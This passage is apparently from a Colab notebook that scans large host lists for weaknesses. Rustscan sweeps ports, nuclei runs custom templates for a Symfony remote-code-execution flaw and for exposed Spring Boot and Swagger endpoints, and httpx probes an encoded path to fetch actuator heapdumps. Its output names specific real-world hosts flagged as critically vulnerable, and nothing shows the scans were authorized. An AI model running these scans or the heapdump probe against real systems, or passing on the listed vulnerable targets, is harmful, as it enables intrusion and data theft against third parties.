        "!cat subs.txt | while read host do; do export HOST=$host; rustscan -a $HOST --ulimit 7000 | grep -E \"Open\" | sed \"s/Open//g\" |sed \"s/ //g\" | anew -q ports.txt; done"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!cat httpx.txt | nuclei -t symfony.yaml"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "onqOUzIbZDW5",
        "outputId": "515a2798-e673-4c25-e1c0-bba926916796"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "                     __     _\n",
            "   ____  __  _______/ /__  (_)\n",
            "  / __ \\/ / / / ___/ / _ \\/ /\n",
            " / / / / /_/ / /__/ /  __/ /\n",
            "/_/ /_/\\__,_/\\___/_/\\___/_/   v2.9.8\n",
            "\n",
            "\t\tprojectdiscovery.io\n",
            "\n",
            "[\u001b[33mWRN\u001b[0m] Found 1 templates loaded with deprecated protocol syntax, update before v3 for continued support.\n",
            "[\u001b[34mINF\u001b[0m] Current nuclei version: v2.9.8 (\u001b[92mlatest\u001b[0m)\n",
            "[\u001b[34mINF\u001b[0m] Current nuclei-templates version: v9.5.4 (\u001b[92mlatest\u001b[0m)\n",
            "[\u001b[34mINF\u001b[0m] New templates added in latest release: 51\n",
            "[\u001b[34mINF\u001b[0m] Templates loaded for current scan: 1\n",
            "[\u001b[34mINF\u001b[0m] Targets loaded for current scan: 1192\n",
            "[\u001b[92mm4cddr-rce-symfony-2\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[31mcritical\u001b[0m] https://api.gcp-networking-demo-f5-uat.ford.com/app_dev.php/_fragment\n",
            "[\u001b[92mm4cddr-rce-symfony-2\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[31mcritical\u001b[0m] https://www.accessories.ford.com/app_dev.php/_fragment\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!cat httpx.txt | httpx --threads 100 --path \"/%61%63%74%75%61%74%6f%72/heapdump\" -mc 200,403,401 -status-code --title -content-length -content-type"
      ],
      "metadata": {
        "id": "EyFP06EFgedB"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "nSWRYCJoQ_oK"
      },
      "outputs": [],
      "source": [
        "!cat httpx.txt | nuclei -t thalys.yaml"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!cat httpx.txt | nuclei --tags springboot"
      ],
      "metadata": {
        "id": "RsaMP6U9vAz9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cat httpx.txt | nuclei -t swagger-api-v2.yaml"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xoDYuAdnuX1W",
        "outputId": "7e8087f1-75f1-4870-a017-62b562827209"
      },
      "execution_count": 15,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "                     __     _\n",
            "   ____  __  _______/ /__  (_)\n",
            "  / __ \\/ / / / ___/ / _ \\/ /\n",
            " / / / / /_/ / /__/ /  __/ /\n",
            "/_/ /_/\\__,_/\\___/_/\\___/_/   v2.9.8\n",
            "\n",
            "\t\tprojectdiscovery.io\n",
            "\n",
            "[\u001b[34mINF\u001b[0m] nuclei-templates are not installed, installing...\n",
            "[\u001b[34mINF\u001b[0m] Successfully installed nuclei-templates at /root/nuclei-templates\n",
            "[\u001b[33mWRN\u001b[0m] Found 1 templates loaded with deprecated protocol syntax, update before v3 for continued support.\n",
            "[\u001b[34mINF\u001b[0m] Current nuclei version: v2.9.8 (\u001b[92mlatest\u001b[0m)\n",
            "[\u001b[34mINF\u001b[0m] Current nuclei-templates version: v9.5.4 (\u001b[92mlatest\u001b[0m)\n",
            "[\u001b[34mINF\u001b[0m] New templates added in latest release: 51\n",
            "[\u001b[34mINF\u001b[0m] Templates loaded for current scan: 1\n",
            "[\u001b[34mINF\u001b[0m] Targets loaded for current scan: 111\n",
            "[\u001b[92mswagger-api-v2\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] https://developers.vendasta.com/api/v1/\n",
            "[\u001b[92mswagger-api-v2\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] https://vendors-demo.vendasta.com/api/v1/\n",
            "[\u001b[34mINF\u001b[0m] CTRL+C pressed: Exiting\n",
            "[\u001b[34mINF\u001b[0m] Creating resume file: /root/.config/nuclei/resume-cijar5j7rtatnskf4k4g.cfg\n"
          ]
        }
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyP2EF2qp+HXGRrnOPI0baIB",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}